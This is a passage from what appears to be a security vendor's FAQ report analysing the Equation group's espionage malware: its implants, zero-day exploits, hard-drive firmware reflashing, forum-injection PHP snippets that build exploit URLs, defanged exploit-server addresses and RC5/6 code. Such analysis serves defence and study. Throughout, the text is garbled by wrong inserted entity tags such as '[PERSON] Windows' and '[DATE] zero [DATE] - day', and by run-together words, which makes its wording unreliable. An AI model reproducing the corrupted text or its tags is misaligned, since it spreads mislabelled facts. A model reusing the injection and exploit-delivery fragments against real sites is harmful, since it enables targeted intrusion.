tandem withGRAYFISH . Looks like an upgrade of [ORG] DOUBLEFANTASY , and is possibly a more recent validator - style plugin.\u2022 GRAYFISH \u2013 The most sophisticated attack platform from the [ORG] EQUATIONgroup . It resides completely in the registry , relying on a bootkit to gain execution at [ORG] OS [ORG] startup.\u2022 [ORG] FANNY \u2013 A computer worm created in [DATE] 2008 and used to gather information about targets in [LOC] the [LOC] Middle [LOC] East and [LOC] Asia . Some victims appear to have been upgraded [ORDINAL] first to [ORG] DoubleFantasy , and then to the [ORG] EQUATIONDRUG system . Fanny used exploits for [CARDINAL] two [DATE] zero [DATE] - day vulnerabilities which were later discovered with Stuxnet.\u2022 EQUATIONLASER \u2013 An early implant from the [ORG] EQUATION group , used around2001 - 2004 . Compatible with [CARDINAL] Windows [CARDINAL] 95/98 , and created sometime between DOUBLEFANTASY and EQUATIONDRUG.564 . What is DOUBLEFANTASY ? The [ORG] Equation group uses an implant known as [ORG] DoubleFantasy ( the internal [PERSON] Kaspersky [PERSON] Lab name ) for the validation of their victims . The implant serves [CARDINAL] two purposes : \u2022 to confirm if the victim is interesting ; If so , the victim is upgradedto the [WORK_OF_ART] EquationDrug or [LAW] GrayFish [LAW] platforms\u2022 to keep a backdoor into a potentially interesting target \u2019s computer [ORG] DoubleFantasy keeps an internal version number in its configuration block , together with other data such as legitimate hosts used to validate the internet Decrypting configuration blocks from all known DoubleFantasy samples , we obtained the following internal version numbers : Interestingly , the most popular versions are [CARDINAL] 8 and [CARDINAL] 12 : Considering the latest version of [ORG] DoubleFantasy is [CARDINAL] 13 and we have only identified [CARDINAL] 4 major versions , we are probably seeing only a small part of the group \u2019s activity.85 . What is EQUATIONDRUG ? [ORG] EQUATIONDRUG is one of the group \u2019s most complex espionage platforms . The platform was developed [DATE] between [DATE] 2003 [DATE] and [DATE] 2013 and subsequently replaced by [NORP] GrayFish . It appears to have been created as an upgrade from the [ORG] EQUATIONLASER platform . A victim does n\u2019t immediately get infected with [ORG] EQUATIONDRUG . [ORDINAL] First , the attackers infect them with [ORG] DOUBLEFANTASY , which is a validator - style plugin . If the victim is confirmed as interesting to the attackers , the [ORG] EQUATIONDRUG installer is delivered . By default , a core set of modules is installed onto the target \u2019s computer together with [ORG] EQUATIONDRUG , giving attackers full control over the operating system . In cases where the basic features of the malware are not enough , [PERSON] EquationDrug supports the addition of new plugins to extend its functionality . We found [CARDINAL] 35 different plugins for [ORG] EquationDrug and [CARDINAL] 18 drivers.9EquationDrug \u2019s core modules , designed for hooking deep into the OS , do not contain a trusted digital signature and can not be run directly on modern operating systems . The code checks whether the OS version predates [PERSON] Windows [PERSON] XP/2003 . Some of the plugins were designed originally for use on [ORG] Windows [ORG] 95/98 / ME . If the target is using a modern operating system such as [EVENT] Windows [EVENT] 7 , the attackers use the [ORG] TripleFantasy or [NORP] GrayFish platforms . [ORG] EquationDrug has an integrated countdown timer , presumably designed to self- destruct if commands are not received from the [ORG] C&C for a period of time ( [DATE] several [DATE] months ) . The information stolen from the PC and prepared for transmission to the [ORG] C&C is stored in encrypted form throughout several fake font files ( * .FON ) inside the Windows\\Fonts folder on the victim 's computer.6 . What is GRAYFISH ? GRAYFISH is the most modern and sophisticated malware implant from the [ORG] Equation group . It is designed to provide an effective ( almost \u201c invisible \u201d ) persistence mechanism , hidden storage and malicious command execution inside the Windows operating system . By all indications , [NORP] GrayFish was developed [DATE] between [DATE] 2008 [DATE] and [DATE] 2013 and is compatible with all modern versions of [ORG] Microsoft \u2019s operating systems , including [EVENT] Windows [EVENT] NT [EVENT] 4.0 , Windows 2000 , Windows XP , [PERSON] Windows [PERSON] Vista , Windows 7 and [CARDINAL] 8 \u2013 both 32 [QUANTITY] - bit and [CARDINAL] 64 - bit versions.10GrayFish includes a highly sophisticated bootkit , which is more complex than any we \u2019ve seen before . This suggests developers of the highest caliber are behind its creation . When the computer starts , [NORP] GrayFish hijacks the OS loading mechanisms by injecting its code into the boot record . This allows it to control the launching of Windows at each stage . In fact , after infection , the computer is not run by itself more : it is [NORP] GrayFish that runs it step by step , making the necessary changes on the fly . After [NORP] GrayFish starts Windows , it launches a multi - stage mechanism ( [CARDINAL] four [CARDINAL] to [CARDINAL] five stages ) of decryption to achieve code execution within the Windows environment . It then runs the functional modules that are stored inside the Windows registry . Each stage decodes and executes the next , and the entire platform will only start after successful execution of all levels . If an error happens during launch , the entire [NORP] GrayFish platform self - destructs.11The [NORP] GrayFish bootloader mechanism12To store stolen information , as well as its own auxiliary information , [NORP] GrayFish implements its own encrypted [ORG] Virtual [ORG] File [ORG] System ( VFS ) inside the Windows registry . To bypass modern OS security mechanisms that block the execution of untrusted code in kernel mode , [NORP] GrayFish exploits several legitimate drivers , including [CARDINAL] one from the [ORG] CloneCD program . This driver ( [PERSON] ElbyCDIO.sys ) contains a vulnerability which [NORP] GrayFish exploits to achieve kernel - level code execution . Despite the fact that the vulnerability was discovered in [DATE] 2009 , the digital signature has not yet been revoked . The [NORP] GrayFish implementation appears to have been designed to make it invisible to antivirus products . When used together with the bootkit , all the modules as well as the stolen data are stored in encrypted form in the registry and dynamically decrypted and executed . There are no malicious executable modules at all on the filesystem of an infected system . An interesting observation : the [ORDINAL] first stage GRAYFISH loader computes the SHA-256 hash of the NTFS of system folder ( % Windows% or % System% ) Object_ID [CARDINAL] one [CARDINAL] thousand times . The result is used as an AES decryption key for the next stage . This is somewhat similar to [GPE] Gauss , which computed the MD5 hash over the name of its target folder [CARDINAL] 10,000 times and used the result as the decryption key.7 . What is Fanny ? Fanny is a computer worm created by the [ORG] Equation group in [DATE] 2008 and distributed throughout [LOC] the [LOC] Middle [LOC] East and [LOC] Asia . Fanny used [CARDINAL] two [DATE] zero [DATE] - day exploits , which were later uncovered during the discovery of Stuxnet . To spread , it used [ORG] the [ORG] Stuxnet [ORG] LNK exploit and [ORG] USB sticks . For escalation of privilege , [ORG] Fanny used a vulnerability patched by the [ORG] Microsoft bulletin MS09 [ORG] - 025 , which from [DATE] 2009 was also used in one of the early versions of Stuxnet . [ORG] LNK exploit as used by [ORG] Fanny13It \u2019s important to point out that these [CARDINAL] two exploits were used in [PERSON] Fanny before they were integrated into Stuxnet , indicating the [ORG] EQUATION group had access to these [DATE] zero [DATE] - days before the Stuxnet group . Actually , the similar type of usage of both exploits together in different computer worms , at around the same time , indicates that the [ORG] EQUATION group and the Stuxnet developers are either the same or working closely together . Fanny malware diagramThe main purpose of [ORG] Fanny appears to have been the mapping of air - gapped networks . For this , it used a unique [ORG] USB - based command and control mechanism . When a [ORG] USB stick is infected , [PERSON] Fanny creates a hidden storage area on the stick . If it infects a computer without an internet connection , it will collect basic system information and save it onto the hidden area of the stick . Later , when a stick containing hidden information is plugged into an internet - connected computer infected by [ORG] Fanny , the data will be scooped up from the hidden area and sent to the C&C. If the attackers want to run commands on the air - gapped networks , they can save these commands in the hidden area of the [ORG] USB stick . When the stick is plugged into the air - gapped computer , [ORG] Fanny will recognize the commands and14execute them . This effectively allowed the [ORG] Equation group to run commands inside air - gapped networks through the use of infected [ORG] USB sticks , and also map the infrastructure of such networks . The Fanny C&C server is currently sinkholed by [PERSON] Kaspersky [PERSON] Lab . The victims map looks as follows:2014 - 2015 Fanny sinkhole statistics8.What exploits does the [ORG] Equation group [ORG] use?We observed the following exploits used by the [ORG] Equation group in their malware : \u2022 Windows Kernel EoP exploit used in Stuxnet [DATE] 2009 ( atempsvc.ocx),fixed with MS09 - 025 . ( [ORG] CVE unknown).\u2022 [ORG] TTF exploit fixed with MS12 [ORG] - 034 ( possibly CVE-2012 - 0159 ) . \u2022 [ORG] TTF exploit fixed with MS13 [ORG] - 081 ( possibly CVE-2013 - 3894 ) . \u2022 [ORG] LNK vulnerability as used by Stuxnet . ( CVE-2010 - 2568 ) . \u2022 CVE-2013 - 3918 ( Internet Explorer).15\u2022 CVE-2012 - 1723 ( [PERSON] Java ) . \u2022 CVE-2012 - 4681 ( Java ) . [CARDINAL] At [CARDINAL] least [CARDINAL] four of these were used as [DATE] zero [DATE] - days by the [ORG] EQUATION group . In addition to these , we observed the use of unknown exploits , possibly [DATE] zero [DATE] - day , against Firefox 17 , as used in the TOR Browser . An interesting case is the use of CVE-2013 - 3918 , which was originally used by the [ORG] APTgroup behind the [DATE] 2009 [PERSON] Aurora attack . The [ORG] EQUATION group captured their exploit and repurposed it to target government users in Afghanistan.9.How do victims get infected by [ORG] EQUATION group [ORG] malware?The [ORG] Equation group relies on multiple techniques to infect their victims . These include : \u2022 Self - replicating ( worm ) code \u2013 Fanny \u2022 Physical media , CD - ROMs \u2022 [ORG] USB sticks + exploits \u2022 Web - based exploits The attacks that use physical media ( CD - ROMs ) are particularly interesting because they indicate the use of a technique known as \u201c interdiction \u201d , where the attackers intercept shipped goods and replace them with Trojanized versions . [CARDINAL] One such incident involved targeting participants at a scientific conference in [GPE] Houston . Upon returning home , some of the participants received by mail a copy of the conference proceedings , together with a slideshow including various conference materials . The compromised CD - ROM used \u201c autorun.inf \u201d to execute an installer that began by attempting to escalate privileges using [CARDINAL] two known [ORG] EQUATION group exploits . Next , it attempted to run the group \u2019s DOUBLEFANTASY implant and install it onto the victim \u2019s machine . The exact method by which these CDs were interdicted is unknown . We do not believe the conference organizers did this on purpose . At the same time , the super - rare DOUBLEFANTASY malware , together with its installer with [CARDINAL] two [DATE] zero [DATE] - day exploits , do n\u2019t end up on a CD by accident . Another example is a [ORG] Trojanized [ORG] Oracle installation CD that contains an [ORG] EQUATIONLASER [ORG] Trojan dropper alongside [ORG] the [ORG] Oracle installer.16Here \u2019s a look at a typical infection cycle : Infection lifecycle : from web exploit to [ORG] EquationDrug and GrayFish10 . What is the most sophisticated thingabout the [ORG] EQUATION group?Although the implementation of their malware systems is incredibly complex , surpassing even Regin in sophistication , there is one aspect of the [ORG] EQUATION group \u2019s attack technologies that exceeds anything we have ever seen before . This is the ability to infect the hard drive firmware . We were able to recover [CARDINAL] two HDD firmware reprogramming modules from the [ORG] EQUATIONDRUG and GRAYFISH platforms . The EQUATIONDRUG HDD firmware reprogramming module has version [CARDINAL] 3.0.1 while the GRAYFISH reprogramming module has version 4.2.0 . These were compiled in [DATE] 2010 and [DATE] 2013 , respectively , if we are to trust the [ORG] PE timestamps.17The [ORG] EQUATION group HDD firmware reprogramming plugin has the internal ID 80AA , which is a unique number in the groups \u2019 plugin ID table . This allows other plugins to identify and use it as required . Both 32- and [CARDINAL] 64 - bit versions of the plugin were found . The plugin supports [CARDINAL] two main functions : reprogramming the HDD firmware with a custom payload from the [ORG] EQUATION group , and providing an API into a set of hidden sectors ( or data storage ) of the hard drive . This achieves several important things : \u2022 Extreme persistence that survives disk formatting and OS reinstall . \u2022 An invisible , persistent storage hidden inside the hard drive . The plugin version [CARDINAL] 3 has the ability to reprogram [CARDINAL] six drive \u201c categories \u201d : \u2022 \u201c Maxtor \u201d , \u201c [WORK_OF_ART] Maxtor \t STM \u201d [WORK_OF_ART] \u2022 \u201c ST \u201d , \u201c [WORK_OF_ART] Maxtor \t STM \u201d , < Seagate Technology > \u2022 \u201c WDC \t WD \u201d , < Western Digital Technologies , Inc > \u2022 \u201c SAMSUNG \u201d , < [ORG] SAMSUNG [ORG] ELECTRONICS CO . LTD > \u2022 \u201c WDC \t WD \u201d , < Western Digital Technologies , Inc > additional vendor specificchecks used ( spawns [CARDINAL] two subclasses)\u2022 < Seagate Technology > The plugin version [CARDINAL] 4 is more complex and can reprogram [CARDINAL] 12 drive \u201c categories\u201d . Plugin version [CARDINAL] 4 infection \u201c capabilities \u201d table18The classes supported are : \u2022 \u201c [ORG] WDC \t WD \u201d , < Western Digital Technologies Inc > additional vendor specificchecks used\u2022 \u201c ST \u201d , \u201c [WORK_OF_ART] Maxtor \t STM \u201d , \u201c SEAGATE \t ST \u201d , < Seagate Technology > \u2022 \u201c SAMSUNG \u201d , < [ORG] SAMSUNG [ORG] ELECTRONICS CO . , [GPE] LTD . > \u2022 \u201c WDC \t WD \u201d , < Western Digital Technologies , Inc. > additional vendor specificchecks [ORG] used\u2022 < HGST [ORG] a [ORG] Western [ORG] Digital Company > , \u201c IC \u201d , \u201c [ORG] IBM \u201d , \u201c [ORG] Hitachi \u201d , \u201c HTS \u201d , \u201c HTE\u201d,\u201cHDS \u201d , \u201c HDT \u201d , \u201c ExcelStor\u201d\u2022 \u201c [PERSON] Max \u201d , \u201c [WORK_OF_ART] Maxtor \t STM \u201d [WORK_OF_ART] \u2022 < MICRON [WORK_OF_ART] TECHNOLOGY , [ORG] INC . > , \u201c C300 \u201d , \u201c [CARDINAL] M4 \u201d \u2022 < HGST a Western Digital Company > , < TOSHIBA CORPORATION > \u2022 \u201c [PERSON] OCZ \u201d , \u201c [ORG] OWC \u201d , \u201c Corsair \u201d , \u201c Mushkin \u201d additional vendor specific checks used [ORG] \u2022 < Samsung [ORG] Electronics Co. , [ORG] Ltd. , [ORG] Storage [ORG] System Division > , < SeagateTechnology > , < [ORG] SAMSUNG [ORG] ELECTRONICS CO . , [GPE] LTD . > + additional checks \u2022 < TOSHIBA CORPORATION COMPUTER DIVISION > , \u201c TOSHIBA \t M \u201d + checks \u2022 < Seagate Technology > , \u201c ST \u201d The main function to reflash the HDD firmware receives an external payload , which can be compressed by LZMA . The disk is targeted by a specific serial number and reprogrammed by a series of [ORG] ATA commands . For example , in the case of [ORG] Seagate drives , we see a chain of commands : \u201c FLUSH CACHE \u201d ( E7 ) \u2192 \u201c DOWNLOAD MICROCODE \u201d ( [CARDINAL] 92 ) \u2192 \u201c IDENTIFY DEVICE \u201d ( [ORG] EC ) \u2192 WRITE \u201c [ORG] LOG [ORG] EXT \u201d ( [CARDINAL] 3F ) . Depending on the reflashing request , there might be some unclear data manipulations written to the drive using \u201c [WORK_OF_ART] WRITE [WORK_OF_ART] LOG [WORK_OF_ART] EXT \u201d ( [CARDINAL] 3F ) . For WD drives , there is a sub - routine searching for ARM [ORG] NOP opcodes in read data , and then used further in following writes . Overall , the plugin uses a lot of undocumented , vendor - specific [ORG] ATA commands , for the drives mentioned above as well as all the others . The [ORG] EQUATION group \u2019s HDD firmware reprogramming module is extremely rare . During our research , we \u2019ve only identified a few victims who were targeted by this module . This indicates that it is probably only kept for the most valuable victims or for some very unusual circumstances.1911 . Have you observed any artifactsindicating who is behind the [ORG] EQUATION group?With threat actor groups as skilled as the [ORG] Equation team , mistakes are rare . Nevertheless , they do happen . Some of the keywords forgotten in the modules that we analyzed include : \u2022 SKYHOOKCHOW \u2022 prkMtx \u2013 unique mutex used by the [ORG] Equation group \u2019s exploitation library(\u201cPrivLib\u201d)\u2022 \u201c SF \u201d \u2013 as in \u201c SFInstall \u201d , \u201c [WORK_OF_ART] SFConfig \u201d \u2022 \u201c UR \u201d , \u201c [ORG] URInstall \u201d \u2013 \u201c Performing UR - specific post - install \u201d \u2022 \u201c implant \u201d \u2013 from \u201c Timeout waiting for the \u201c canInstallNow \u201d event from theimplant - specific EXE!\u201d\u2022 STEALTHFIGHTER \u2013 ( VTT/82055898 / STEALTHFIGHTER/2008 - 10 - 16/14:59:06.229 - 04:00)\u2022 [ORG] DRINKPARSLEY \u2013 ( Manual / DRINKPARSLEY/2008 [ORG] - 09 - 30/10:06:46.468 - 04:00)\u2022 STRAITACID \u2013 ( VTT/82053737 / STRAITACID/2008 - 09 - 03/10:44:56.361 - 04:00)\u2022 LUTEUSOBSTOS \u2013 ( VTT/82051410 / LUTEUSOBSTOS/2008 - 07 - 30/17:27:23.715 - 04:00)\u2022 [ORG] STRAITSHOOTER STRAITSHOOTER30.exe \u2022 \u201c RMGREE5 \u201d \u2013 c:\\users\\rmgree5\\ 20Interestingly , the [ORG] VTT strings above appear to contain a timestamp and an infection counter . [CARDINAL] Between [CARDINAL] four events \u2013 [DATE] 10 [DATE] October [DATE] 2008 , [DATE] 30th [DATE] of [DATE] July [DATE] 2008 , [ORDINAL] 3rd of September 2008 and [CARDINAL] 30 of September 2008 \u2013 we count an average of [DATE] 2000 infections per month , if the serial number increases linearly . This could indicate that the [ORG] EQUATION group hits [CARDINAL] about [CARDINAL] 2000 users per month , although it \u2019s possible some \u201c uninteresting \u201d victims may be disinfected . Note : The codename [ORG] GROK appears in several documents published by [PERSON] Der [PERSON] Spiegel , where \u201c a keylogger \u201d is mentioned . Our analysis indicates EQUATIONGROUP \u2019s [ORG] GROK plugin is indeed a keylogger on steroids that can perform many other functions.12 . How many victims are there ? The victims of the [ORG] Equation group were observed in [CARDINAL] more [CARDINAL] than [CARDINAL] 30 countries , including [GPE] Iran , [GPE] Russia , [GPE] Syria , [GPE] Afghanistan , [GPE] Kazakhstan , [GPE] Belgium , [GPE] Somalia , [GPE] Hong [GPE] Kong , [GPE] Libya , [GPE] United [GPE] Arab [GPE] Emirates , [GPE] Iraq , [GPE] Nigeria , [GPE] Ecuador , [GPE] Mexico , [GPE] Malaysia , [GPE] United [GPE] States , [GPE] Sudan , [GPE] Lebanon , [GPE] Palestine , [GPE] France , [GPE] Germany , [GPE] Singapore , [GPE] Qatar , [GPE] Pakistan , [GPE] Yemen , [GPE] Mali , [GPE] Switzerland , [GPE] Bangladesh , [GPE] South [GPE] Africa , [GPE] Philippines , [GPE] United [GPE] Kingdom , [GPE] India and Brazil.21Islamic activists and scholarsVictims generally fall into the following categories : \u2022 Governments and diplomatic institutions \u2022 Oil and gas \u2022 Companies developing cryptographic technologies Combining statistics from [ORG] KSN and our sinkhole , we counted [CARDINAL] more [CARDINAL] than [CARDINAL] 500 victims worldwide . A lot of infections have been observed on servers , often domain controllers , data warehouses , website hosting and other types of servers . At the same time , the infections have a self - destruct mechanism , so we can assume there were probably [CARDINAL] tens [CARDINAL] of [CARDINAL] thousands of infections around the world throughout the history of the [ORG] Equation group \u2019s operations . As an interesting note , some of the \u201c patients [CARDINAL] zero \u201d of Stuxnet seem to have been infected by the [ORG] EQUATION group . It is quite possible that the [ORG] EQUATION group malware was used to deliver the STUXNET payload.2213 . Have you seen any non - Windows malware from [FAC] the [FAC] Equation [FAC] group?All the malware we have collected so far is designed to work on [ORG] Microsoft \u2019s Windows operating system . However , there are signs that non - Windows malware does exist . For instance , [CARDINAL] one of the sinkholed [ORG] C&C domains is currently receiving connections from a large pool of victims in [GPE] China that appear to be Mac OS X computers ( based on the user - agent ) . The malware callbacks are consistent with the [ORG] DOUBLEFANTASY schema , which normally injects into the system browser ( for instance , Internet Explorer on Windows ) . The callbacks for the suspected Mac OS X versions have the following user agents : \u2022 Mozilla/5.0 ( [ORG] Macintosh ; [ORG] Intel [ORG] Mac [ORG] OS [ORG] X 10_8_2 ) AppleWebKit/536.26.17(KHTML , like [GPE] Gecko ) [NORP] Version/6.0.2 Safari/536.26.17\u2022 Mozilla/5.0 ( [ORG] Macintosh ; [ORG] Intel [ORG] Mac [ORG] OS [ORG] X [ORG] 10.8 ; rv:21.0 ) Gecko/20100101Firefox/21.0\u2022 Mozilla/5.0 ( [ORG] Macintosh ; [ORG] Intel [ORG] Mac [ORG] OS [ORG] X [ORG] 10_8_3 ) AppleWebKit/536.28.10(KHTML , like [GPE] Gecko ) Version/6.0.3 Safari/536.28.10This leads us to believe that a Mac OS X version of [ORG] DOUBLEFANTASY also exists . Additionally , we observed that one of the malicious forum injections , in the form of a [ORG] PHP script , takes special precautions to show a different type of HTML code to [ORG] Apple iPhone visitors . Unlike other cases , such as visitors from [GPE] Jordan , which does not get targeted , [ORG] iPhone visitors are redirected to the exploit server , suggesting the ability to infect [ORG] iPhones as well.2314 . What [ORG] C&C infrastructure do the [ORG] Equationgroup implants use?The [ORG] Equation group uses a vast [ORG] C&C infrastructure that includes [CARDINAL] more [CARDINAL] than [CARDINAL] 300 domains and [CARDINAL] more [CARDINAL] than [CARDINAL] 100 servers . The servers are hosted in multiple countries , including the [GPE] US , [GPE] UK , [GPE] Italy , [GPE] Germany , [GPE] Netherlands , [GPE] Panama , [GPE] Costa [GPE] Rica , [GPE] Malaysia , [GPE] Colombia and [GPE] Czech [GPE] Republic . All [ORG] C&C domains appear to have been registered through the same [CARDINAL] two major registrars , using \u201c [WORK_OF_ART] Domains [WORK_OF_ART] By [WORK_OF_ART] Proxy \u201d to mask the registrant \u2019s information . [PERSON] Kaspersky [PERSON] Lab is currently sinkholing [CARDINAL] a [CARDINAL] couple [CARDINAL] dozen of the [CARDINAL] 300 [ORG] C&C servers.15 . How do victims get selected for infectionby the [ORG] EQUATION group?The [ORG] EQUATION group sometimes selects its victims with surgical precision . When precision is not possible , the victims are targeted by a validator ( DOUBLEFANTASY ) implant and subsequently disinfected if they do not appear to be \u201c interesting \u201d to the attackers . Here are some web - based targeting examples from the [ORG] Equation group : On [DATE] March [DATE] 2 , [DATE] 2013 , a Kaspersky Lab user browsing an online forum was attacked with an exploit from [CARDINAL] one of the [ORG] Equation group \u2019s exploitation servers:2013 - 03 - 02 \u2013 technicalconsumerreports[.]com / modular / assemble.php?params = YoGKKdExT[snip ] cS5kS5t0bvGQyB8miDu+Agn \u2013 detected HEUR : Exploit . Script . GenericThe attack was unsuccessful as it was caught by our product and the user was protected . The attack was targeting Firefox 17 ( TOR [PERSON] Browser ) , using an unknown exploit that we have not recovered . Looking further , we identified a few other known Equation servers used in similar attacks even earlier:2012 [TIME] - [TIME] 12 [TIME] - [TIME] 11 \u2013 technology - revealed[.]com / diagram / navigate.html?overlay = AL[snip]OISn6sI1&sn = [NORP] d1[SNIP]dd24These attacks were delivered in several ways \u2013 for example , while the user visited a number of [ORG] Islamic [ORG] Jihadist discussion forums , or via advertisements on popular websites in [LOC] the [LOC] Middle [LOC] East . The forums in question appear to have been compromised by a specific [ORG] PHP script that exploited only authenticated visitors . We were able to obtain one of these [ORG] PHP scripts embedded in a discussion forum : Malicious [ORG] PHP script injected into hacked discussion forumsThis [ORG] PHP script provides a multitude of interesting information about the attacks . It was [ORDINAL] first designed to work as part of [ORG] vBulletin , a commercial forum platform . It specifically checks if the visitor \u2019s username MD5 matches [CARDINAL] two values : In practice , this means that only logged - in users will be exploited . Next , the [ORG] PHP exploitation script checks if the user comes from a specific address range : is the only specific [ORG] IP mentioned ) we get the following TOP [CARDINAL] 3 countries that will NOT be exploited : This means that the attackers have taken special care not to infect users visiting from certain ISPs in these countries . If the visitors are from any other [ORG] IP range , the [ORG] PHP script constructs an exploitation URL which includes the logged in [ORG] vBulletin forum name:$htt=\"url QQofe6Y0THS8E3hfBC+M+k7CdBmTH5gAkLvgV8EV3ULW+7KoUjbJ4UOFU6SVOtgEK7zTgPPNoDH z4vKecDGe7OzDmJlvwKvc5uYg / I/5x9\";$htt=$htt . \"&sn=\".bin2hex(substr($u,0,14));The [ORG] vBulletin forum username is stored in hex , as the \u201c sn= \u201d parameter to the exploit site . The exploit site can choose to hit the visitor with an exploit depending on the username , meaning that the attackers are taking great care to infect only very specific targets on these forums . Interestingly , the [ORG] PHP script produces a different HTML page for [ORG] iPhone visitors : if ( preg_match('/iPhone/',$_SERVER['HTTP_USER_AGENT'])){$scroll='yes ' ; } \u2022 This indicates that the exploit server is probably aware of [ORG] iPhone visitors and can deliver exploits for them as well ; otherwise , the exploitation URL can simply be removed for these visitors . Most recently , the attackers used [PERSON] Java exploits , delivered through a specific server to visitors from [LOC] the [LOC] Middle [LOC] East via advertising networks on popular websites . Here \u2019s an example : [ORG] standardsandpraiserepurpose[.]com / login?qq=5eaae4d[SNIP]0563&rr=1&h = cc593a6bfd8e1e 26c2734173f0ef75be3527a20526These [DATE] 2013 [DATE] - 2014 attacks make use of a new domain , [ORG] standardsandpraiserepurpose[.]com . Interesting to point out the similarity in the URL construction , with parameters \u201c rr=1 \u201d , followed by \u201c h= \u201d a value resembling a SHA1 hash , possibly the specific targeted username . Other however , unlike the forum MD5 hashes , we could n\u2019t break any of them . The exploits from [ORG] standardsandpraiserepurpose[.]com targeted several [PERSON] Kaspersky [PERSON] Lab users and were all unsuccessful . The server attempts [CARDINAL] three different [PERSON] Java exploits , containing the same payload stored as \u201c info.dat \u201d inside the [PERSON] Java archive . These are simple downloaders that contain shellcode to download and execute the next stage from the [ORG] C&C : Unfortunately , we were n\u2019t able to download a copy of the next stage as the URL was already dead at the time of checking , or else it is only served and built specifically for victims at specific IPs . Another unusual aspect of targeting included multiple infection attempts against users of a certain satellite internet provider in Afghanistan.2716 . What kind of encryption algorithmsare used by [ORG] the [ORG] EQUATION [ORG] group?The [ORG] Equation group uses the RC5 and RC6 encryption algorithms quite extensively throughout their creations . They also use simple [WORK_OF_ART] XOR , substitution tables , RC4 and [ORG] AES . RC5 and RC6 are [CARDINAL] two encryption algorithms designed by [PERSON] Ronald [PERSON] Rivest in [DATE] 1994 and [DATE] 1998 . They are very similar to each other , with RC6 introducing an additional multiplication in the cypher to make it more resistant . Both cyphers use the same key setup mechanism and the same magical constants named P and [GPE] Q. The [GPE] RC5/6 implementation from [ORG] Equation group \u2019s malware is particularly interesting and deserves special attention because of its specifics . Encryption - related code in a [ORG] DoubleFantasy sampleIn the screenshot above , one can observe the main loop of a RC6 key setup subroutine extracted from [CARDINAL] one of the [ORG] Equation group samples.28This is how it looks in [PERSON] pseudocode:*(_DWORD \t * ) buf \t = \t [PERSON] 0xB7E15163 ; * ( _ DWORD \t * ) ( buf \t + \t 4 \t * \t i ) \t = \t * ( _ DWORD \t * ) ( buf \t + \t 4 \t * \t i \t \u2013 \t 4 ) \t \u2013 \t [DATE] 0x61C88647 ; while \t ( \t i \t < \t 44 \t ) ; [CARDINAL] One immediately notices the constants [CARDINAL] 0xB7E15163 and [DATE] 0x61C88647 . Here \u2019s what a normal RC6 key setup code looks like : void \t RC5_SETUP(unsigned \t char \t * K ) \t / * \t secret \t input \t key \t K[0 b-1 ] \t * / { \t WORD \t i , \t j , \t k , \t u = w/8 , \t A , \t B , \t L[c ] ; / * \t Initialize \t L , \t then \t S , \t then \t mix \t key \t into \t S \t * /for \t ( i = b-1,L[c-1]=0 ; \t i!=-1 ; \t i-- ) \t L[i / u ] \t = \t ( L[i / u]<<8)+K[i];for \t ( [GPE] S[0]=0xB7E15163,i=1 ; \t i < t ; \t i++ ) \t S[i ] \t = \t [ORG] S[i-1]+0x9E3779B9 ; [ ] } See : url Interestingly , the so - called Q constant usage is a bit different in the reference code . Inside the [ORG] Equation group malware , the encryption library uses a subtract operation with the constant [DATE] 0x61C88647 . In most publicly available RC5/6 code , this constant is usually stored as [CARDINAL] 0x9E3779B9 , which is basically -0x61C88647 . Since an addition is faster on certain hardware than a subtraction , it makes sense to store the constant in its negative form and adding it instead of [DATE] subtracting.29RC5 key setup reference document [PERSON] RFC2040 ( url for \u201c [WORK_OF_ART] 0x61C88647 [WORK_OF_ART] 0xB7E15163 \u201d on Google results in barely [CARDINAL] two pages of results , indicating this combination of constants is relatively rare . Most of the hits are on [NORP] Chinese forums . Searching for the [CARDINAL] 2 - inverse constant \u201c 0x9E3779B9 0xB7E15163 \u201d results in a whopping [CARDINAL] 2500 hits.30Interestingly , Regin implements the same constants in its RC5 code . Here \u2019s how the RC5 key setup code looks in Regin : In total , we identified [CARDINAL] 20 different compiled versions of the [GPE] RC5/6 code in the [ORG] Equation group malware . Although similar , the RC5 code is a bit different in Regin \u2013 none of the known Equation samples uses the \u201c [PRODUCT] C7 [PRODUCT] 41 [PRODUCT] 10 \u201d opcode for setting up the P constant , as Regin does . This suggests that the [ORG] EQUATION group and the [ORG] Regin group are [CARDINAL] two different entities.17 . How does the [ORG] EQUATION group \u2019s attackplatforms compare with Regin?To attack their victims , the [ORG] EQUATION group used several cyberespionage platforms over [DATE] the [DATE] last [DATE] 14 [DATE] years . These include : \u2022 EQUATIONLASER \u2013 around [DATE] 2001 [DATE] - [DATE] 2003 \u2022 EQUATIONDRUG \u2013 2003 to 2013 \u2022 GRAYFISH 1.0 \u2013 2008 - present \u2022 GRAYFISH [CARDINAL] 2.0 \u2013 2012 - present31With EQUATIONDRUG , we observed the use of virtual file systems , which is also one of the trademarks of the [ORG] Regin group . This was taken to further extreme in [ORG] GRAYFISH , which exclusively uses the registry to store all malware - related modules and data in encrypted format . The GRAYFISH registry - based architecture is more flexible , stealthy and more complex than Regin , for several reasons : \u2022 It does n\u2019t use any files on disk which can be easily spotted by anomaly finders . \u2022 Each registry branch is encrypted with its own key , making decryption impossiblewithout having the whole package.\u2022 Registry storage offers better granularity and less wasted space than [ORG] Regin\u2019sVFSes . In addition , we can compare the [CARDINAL] two platforms by their startup mechanisms . While [CARDINAL] 64 - bit [ORG] Regin uses a service that loads the remaining of the code from the end of the last partition on disk and further from the [ORG] VFSes , [ORG] GRAYFISH takes this a step further . The GRAYFISH bootkit starts from the [ORG] VBR , loads the operating system and hijacks the loading of the [ORDINAL] first driver in the kernel . Next , it loads all the other malware stages from the registry , making it almost completely invisible in terms of footprint . Finally , in terms of advanced features , GRAYFISH and [ORG] EQUATIONDRUG include perhaps the most sophisticated persistence mechanism we \u2019ve ever seen : re - flashing the HDD firmware . Due to the complexity of this process and the knowledge and resources required to implement something like it , the mechanism appears to be out of the reach of most advanced threat groups in the world except the [ORG] EQUATION group . These as well as other general observations lead us to conclude that the [ORG] EQUATION group surpasses Regin in sophistication and resources.18 . How did you discover this malware ? We discovered [CARDINAL] one of the [ORDINAL] first [ORG] EQUATIONDRUG modules during our research into the [ORG] Regin nation - state [ORG] APT operation . Somewhere in [LOC] the [LOC] Middle [LOC] East , there is a computer we are calling the \u201c [WORK_OF_ART] The [WORK_OF_ART] Magnet [WORK_OF_ART] of [WORK_OF_ART] Threats \u201d because in addition to Regin , it was also infected by [PERSON] Turla , [ORG] ItaDuke , [ORG] Animal [ORG] Farm and Careto / Mask . When we tried to analyze the Regin infection on this computer , we identified another module which did not appear to be part of the Regin infection , nor any of the other APTs.32Further investigation into this module led us to the discovery of the [ORG] EQUATIONDRUG 